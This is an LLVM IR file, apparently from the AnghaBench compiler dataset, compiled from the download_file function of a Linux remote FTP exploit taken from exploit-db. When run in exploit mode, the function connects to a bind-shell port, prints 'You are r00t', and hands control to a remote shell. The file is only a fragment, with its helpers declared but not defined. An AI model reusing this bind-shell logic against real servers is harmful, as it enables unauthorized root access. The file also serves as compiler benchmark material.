; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_110.c_download_file.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_110.c_download_file.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [12 x i8] c"Downloading\00", align 1
@controlSock = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"RETR %s\0D\0A\00", align 1
@filename = common dso_local global i32 0, align 4
@FAILURE = common dso_local global i32 0, align 4
@EXPLOIT_DOWNLOAD = common dso_local global i32 0, align 4
@BINDSHELL_PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [29 x i8] c"\0AConnected! You are r00t...\0A\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"\0ADid you have a nice time?\0A\00", align 1
@SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @download_file(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %3, align 4
  %9 = call i32 @status_bar(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* @controlSock, align 4
  %11 = load i32, i32* @filename, align 4
  %12 = call i32 @my_send(i32 %10, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %11)
  %13 = call i32 @memset(%struct.sockaddr_in* %8, i32 0, i32 4)
  %14 = call i32 (...) @create_passive_server()
  store i32 %14, i32* %5, align 4
  store i32 4, i32* %4, align 4
  %15 = load i32, i32* %5, align 4
  %16 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %17 = call i32 @timeout_accept(i32 %15, %struct.sockaddr* %16, i32* %4)
  store i32 %17, i32* %6, align 4
  %18 = icmp slt i32 %17, 0
  br i1 %18, label %19, label %23

19:                                               ; preds = %1
  %20 = load i32, i32* %5, align 4
  %21 = call i32 @close(i32 %20)
  %22 = load i32, i32* @FAILURE, align 4
  store i32 %22, i32* %2, align 4
  br label %53

23:                                               ; preds = %1
  %24 = load i32, i32* %3, align 4
  %25 = load i32, i32* @EXPLOIT_DOWNLOAD, align 4
  %26 = icmp eq i32 %24, %25
  br i1 %26, label %27, label %43

27:                                               ; preds = %23
  %28 = load i32, i32* @BINDSHELL_PORT, align 4
  %29 = call i32 @connect_to_server(i32 %28)
  store i32 %29, i32* %7, align 4
  %30 = icmp sge i32 %29, 0
  br i1 %30, label %31, label %37

31:                                               ; preds = %27
  %32 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %33 = load i32, i32* %7, align 4
  %34 = call i32 @do_remote_shell(i32 %33)
  %35 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0))
  %36 = call i32 @exit(i32 0) #3
  unreachable

37:                                               ; preds = %27
  %38 = load i32, i32* %6, align 4
  %39 = call i32 @close(i32 %38)
  %40 = load i32, i32* %5, align 4
  %41 = call i32 @close(i32 %40)
  %42 = load i32, i32* @SUCCESS, align 4
  store i32 %42, i32* %2, align 4
  br label %53

43:                                               ; preds = %23
  %44 = load i32, i32* %6, align 4
  %45 = call i32 @my_recv(i32 %44)
  %46 = load i32, i32* %6, align 4
  %47 = call i32 @close(i32 %46)
  %48 = load i32, i32* %5, align 4
  %49 = call i32 @close(i32 %48)
  %50 = load i32, i32* @controlSock, align 4
  %51 = call i32 @my_recv(i32 %50)
  %52 = call i32 (...) @check_status()
  store i32 %52, i32* %2, align 4
  br label %53

53:                                               ; preds = %43, %37, %19
  %54 = load i32, i32* %2, align 4
  ret i32 %54
}

declare dso_local i32 @status_bar(i8*) #1

declare dso_local i32 @my_send(i32, i8*, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @create_passive_server(...) #1

declare dso_local i32 @timeout_accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @connect_to_server(i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @do_remote_shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @my_recv(i32) #1

declare dso_local i32 @check_status(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
